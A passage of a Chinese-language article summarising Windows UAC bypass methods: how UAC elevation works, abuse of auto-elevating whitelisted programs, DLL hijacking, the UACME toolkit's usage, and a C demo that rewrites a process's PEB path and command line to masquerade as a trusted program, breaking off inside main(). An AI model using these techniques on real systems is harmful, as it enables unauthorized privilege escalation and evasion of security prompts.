# BypassUAC原理及方法汇总
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
本文为UAC绕过方式的一些总结，辅以一些个人理解，请各位大佬指正。
## 什么是UAC
根据MSDN中的[文档](https://docs.microsoft.com/en-us/cpp/security/how-user-account-control-uac-affects-your-application?redirectedfrom=MSDN&view=vs-2019),User
Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.
> 通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC
> 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。
> Launched with virtualization意味着对注册表或者文件系统的更改会在程序结束时失效
>
> launched without elevated privilege 即在非特权级下运行
从上图中,我们看到如果想获取管理员权限(让程序在特权级运行),有以下几种方式:
  * 通过run as administer/ 在shell中执行runas
  * 未启用UAC
  * 进程已经拥有管理权限控制
  * 进程被用户允许通过管理员权限运行
## UAC的实现
ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户/进程能够这个资源。
在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 `Access Token`  
如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access
Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。
可以使用`whoami /priv` 看当前的权限
在研究一些对抗方法的时候,我们可以从“ **安全总是要让步于业务**
”这个不成文的规则入手,不管是一些为了用户体验导致的安全性上的牺牲,或者是为了业务逻辑不得不做的一些不安全配置都是因为如此,举一个例子:我们在开启UAC的情况下，向安装位置在%PROGRAMFILES%安装文件时，总会弹出UAC提示，但是我们安装完成后，在进行程序卸载时却不会弹出任何UAC提示，细心的思考一下，你可能就会开始琢磨其中的端倪。本质上是因为Widnows为这些程序（或者接口）开启了autoElevate,也就是说Windows系统本身维护了一批这样的在UAC白名单中的程序,而我们就可以利用他们来绕过UAC,当然,这只是其中一种方式.
## 触发UAC
  * 配置Windows Update
  * 增加或删除用户账户
  * 改变用户的账户类型
  * 改变UAC设置
  * 安装ActiveX
  * 安装或移除程序
  * 安装设备驱动程序
  * 设置家长控制
  * 将文件移动或复制到Program Files或Windows目录
  * 查看其他用户文件夹
等等有很多,具体参考[这里](https://en.wikipedia.org/wiki/User_Account_Control#Tasks_that_trigger_a_UAC_prompt)
**触发流程** :  
在触发 `UAC`
时，系统会创建一个`consent.exe`进程，该进程用以确定是否创建管理员进程（通过白名单和用户选择判断），然后`creatprocess`请求进程,将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程
## BypassUAC
目前公开的绕过UAC的几种方式:
  1. 各类的UAC白名单程序的DLL劫持
  2. 各类自动提升权限的COM接口利用(Elevated COM interface)
  3. Windows 自身漏洞提权
  4. 远程注入
本文主要论述前两种方法
###  UACME
在分析之前,先介绍一个项目:https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法,后续会提到,其中包括的工具列表如下:
  * Akagi 是项目的主程序，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。
  * Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码
  * Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法
  * Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码
  * Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码
  * Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码
  * Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件
  * Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了
  * Naka 又叫做“空气”，压缩及亦或编码的小工具源码
  * Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具
clone到本地后,用VS2019打开,选择uacme.vcxproj,以Release|x64去build(这个根据需要,64位系统就用x64),然后`ctrl+b`build项目,生成的项目在source/Akag/output下
####  Akagi64
使用`vs2019`本地编译后可以使用`akagi32 41`或者`akagi64
41`启动程序，`41`这个指的是`README`中描述的方法索引，运行后可以直接得到管理员权限的`cmd`窗口。
####  Yuubari
编译方法同上,会生成一个UacInfo64.exe,该工具可以快速查看系统的UAC设定信息以及所有可以利用的程序和COM组件,使用方法如下(会在同一目录下生成一个log文件记录所有输出结果)
这个怎么看,后面会说
###  利用白名单
上文也已经分析了,如果进程本身具有管理员权限或者可以直接获取管理员权限的话,就不会弹出UAC框让用户确认,这类程序被称为白名单程序，例如：`slui.exe`、`wusa.exe`、`taskmgr.exe`、`msra.exe`、`eudcedit.exe`、`eventvwr.exe`、`CompMgmtLauncher.exe`，`rundll32.exe`，`explorer.exe`等等。
常见的利用方式有：
  * `DLL`注入（`RDI`技术），一般注入到常驻内存的可信进程，如：`explorer`
  * `DLL`劫持，常和注册表配合使用达到劫持目的
####  伪装成白名单的方法
后续提到的很多方法都需要白名单的进程调用才能自动提权,但是我们的程序本身是我不在白名单的,此时就需要使用伪装白名单的方式来伪装成白名单的调用,使用的方法是伪装进程PEB.
_PEB结构_ （Process Envirorment Block Structure）.
英文翻译过来就是进程环境信息块,微软并未完全公布该结构的所有字段含义,只是公布了部分的.该结构中存放了进程信息，每个进程都有自己的 PEB
信息。通过修改目标进程的PEB结构中的路径信息和命令行信息为想要伪装的对象一致,就可以将目标进程伪装成想要伪装的目标.实现原理如下:
  1. 通过NtQueryInformationProcess函数获取指定进程PEB地址。因为该进程与我们的进程可能不在一个进程空间内，所以需要调用WIN32API函数ReadProcessMemory和WriteProcessMemory函数来读写目标进程内存。
  2. 根据PEB中的ProcessParameters来获取并修改指定进程的RTL_USER_PROCESS_PARAMETERS信息，这个结构体中保存了PEB的路径信息、命令行信息，修改之后，即可实现进程伪装。
**注意**
，如果修改进程运行在64位系统上，那么就要编译为64位；反之，如果修改进程运行在32位系统上，那么就要编译为32位。（跟被修改进程无关）这样才能成功修改PEB。
几个关键结构/函数：
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PPEB PebBaseAddress; //peb的基地址
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;
用NtQueryInformationProcess获取到的内存信息就是该结构的，其中的PebBaseAddress字段记录了PEB的基地址，为一个_PEB的结构体指针
    typedef struct _PEB {
      BYTE                          Reserved1[2];
      BYTE                          BeingDebugged; //被调试状态 这个很多地方用到
      BYTE                          Reserved2[1];
      PVOID                         Reserved3[2];
      PPEB_LDR_DATA                 Ldr;
      PRTL_USER_PROCESS_PARAMETERS  ProcessParameters; // 进程参数信息
      BYTE                          Reserved4[104];
      PVOID                         Reserved5[52];
      PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
      BYTE                          Reserved6[128];
      PVOID                         Reserved7[1];
      ULONG                         SessionId;
    } PEB, *PPEB;
主要用到ProcessParameters，PRTL_USER_PROCESS_PARAMETERS的结构为：
    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE Reserved1[16];
        PVOID Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
我们只要关注ImagePathName和CommandLine，所以来看看这个UNICODE_STRING结构：
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;
然后是几个关键函数：
    BOOL ReadProcessMemory(
      _In_ HANDLE  hProcess, // 进程句柄
      _In_ LPCVOID lpBaseAddress, // 读取基址 指向指定进程空间
      _Out_ LPVOID  lpBuffer, // 接收缓存
      _In_ SIZE_T  nSize, // 读取大小
      _Out_opt_ SIZE_T  *lpNumberOfBytesRead // 接收数据的实际大小 可以设置为NULL
    );
ReadProcessMemory函数从指定的进程中读入内存信息，被读取的区域必须具有访问权限(PROCESS_VM_READ)。函数执行成功返回非零值。否则返回零，可以使用GetLastError函数获取错误码。
    BOOL WriteProcessMemory(
      _In_ HANDLE  hProcess, // 进程句柄 INVALID_HANDLE_VALUE表示自身进程
      _In_ LPVOID  lpBaseAddress, // 写入内存首地址
      _Out_ LPCVOID lpBuffer, // 指向欲写入的数据
      _In_ SIZE_T  nSize, // 写入大小
      _Out_opt_ SIZE_T  *lpNumberOfBytesWritten // 接收实际写入大小 可以设置为NULL
    );
WriteProcessMemory函数能写入某一进程的内存区域。入口区必须可以访问(PROCESS_VM_WRITE和PROCESS_VM_OPERATION
)，否则操作将失败
这里自己写一个小Demo来帮助理解:
    #include 
    #include 
    #include  //PEB Structures, NtQueryInformationProcess
    #include 
    //prepare for call NtQueryInformationProcess func
    typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)(
        IN HANDLE ProcessHandle,
        IN PROCESSINFOCLASS ProcessInformationClass,
        OUT PVOID ProcessInformation,
        IN ULONG ProcessInformationLength,
        OUT PULONG ReturnLength OPTIONAL
        );
    // modify ImagePathName and CommandLine in PEB of specific process
    BOOL DisguiseProcess(DWORD dwProcessId, wchar_t* lpwszPath, wchar_t* lpwszCmd) {
        // get handle of process
        /*
        OpenProcess(访问权限, 进程句柄是否被继承, 要被打开的进程PID)
        */
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
        if (hProcess == NULL) {
            printf("Open Process error!");
            return FALSE;
        }
        // prepare for getting PEB
        typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        PEB peb = { 0 };
        RTL_USER_PROCESS_PARAMETERS Param = { 0 };
        USHORT usCmdLen = 0;
        USHORT usPathLen = 0;
        const WCHAR* NTDLL = L"ntdll.dll";
        //NtQueryInformationProcess这个函数没有关联的导入库，必须使用LoadLibrary和GetProcessAddress函数从Ntdll.dll中获取该函数地址
        NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibrary(NTDLL), "NtQueryInformationProcess");
        if (NULL == NtQueryInformationProcess)
        {
            printf("GetProcAddress Error");
            return FALSE;
        }
        // get status of specific process
        NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
        if (!NT_SUCCESS(status))
        {
            printf("NtQueryInformationProcess failed");
            return FALSE;
        }
        // get PebBaseAddress in PROCESS_BASIC_INFORMATION of prococess
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
        // get ProcessParameters in PEB of process
        ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);
        // modify cmdline data
        usCmdLen = 2 + 2 * wcslen(lpwszCmd); // cal lenth of unicode str
        WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL);
        WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
        // modify path data
        usPathLen = 2 + 2 * wcslen(lpwszPath); // cal lenth of unicode str
        WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
        WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);
        return TRUE;
    }
    // get PID by ProcessName
    DWORD FindProcId(const WCHAR* ProcName) {
        DWORD ProcId = 0; // target procId
        PROCESSENTRY32 pe32 = { 0 };  // to get snapshot structure
        pe32.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hProcessShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // get snapshot list
        if (hProcessShot == INVALID_HANDLE_VALUE) {
            puts("get proc list error");
            return 0;
        }
        BOOL cProc = Process32First(hProcessShot, &pe32); // prepare for loop of proc snapshot list
        // compare proc name and get correct process Id
        while (cProc) {
            if (wcscmp(pe32.szExeFile, ProcName) == 0) {
                ProcId = pe32.th32ProcessID;
                break;
            }
            cProc = Process32Next(hProcessShot, &pe32);
        }
        return ProcId;
    }
    int main()
    {
        const WCHAR* ProcessName = L"Calculator.exe";
        do {